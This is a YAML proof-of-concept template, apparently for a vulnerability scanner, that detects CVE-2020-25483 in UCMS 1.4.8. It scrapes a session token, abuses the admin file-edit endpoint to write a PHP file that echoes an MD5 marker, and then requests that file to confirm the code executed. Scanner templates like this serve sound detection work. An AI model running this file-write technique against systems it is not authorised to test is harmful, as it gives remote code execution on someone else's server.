name: poc-yaml-ucms-v148-cve-2020-25483
transport: http
set:
  f1: randomInt(40000, 44800)
  randname: randomLowercase(6)
rules:
  r0:
    request:
      cache: true
      method: GET
      path: ^/ucms/index.php?do=user
      follow_redirects: false
    expression: |
        response.status == 200 && response.body.bcontains(b"cmsversion") && response.body.bcontains(b"UCMS 1.4.8")
    output:
      search: '"uuu_token=(?P<pass>\\w+)".bsubmatch(response.body)'
      pass: search["pass"]
  r1:
    request:
      cache: true
      method: POST
      path: ^/ucms/index.php?do=sadmin_fileedit&dir=/ucms/&file={{randname}}.php
      headers:
        Accept-Encoding: gzip, deflate
        Content-Type: application/x-www-form-urlencoded
      body: uuu_token={{pass}}&co=%3C%3fphp+echo+md5({{f1}})%3b%3f%3E&pos=17
      follow_redirects: false
    expression: |
      response.status == 200
  r2:
    request:
      cache: true
      method: GET
      path: ^/ucms/{{randname}}.php
      follow_redirects: false
    expression: |
      response.status == 200 && response.body.bcontains(bytes(md5(string(f1))))
expression: r0() && r1() && r2()
detail:
  author: Mocha
  links:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25483
  vulnfo: CVE-2020-25483
  vulnerability:
    id: CT-142958
    level: critical
  warning: 注意该脚本会上传文件产生一个临时的无害文件
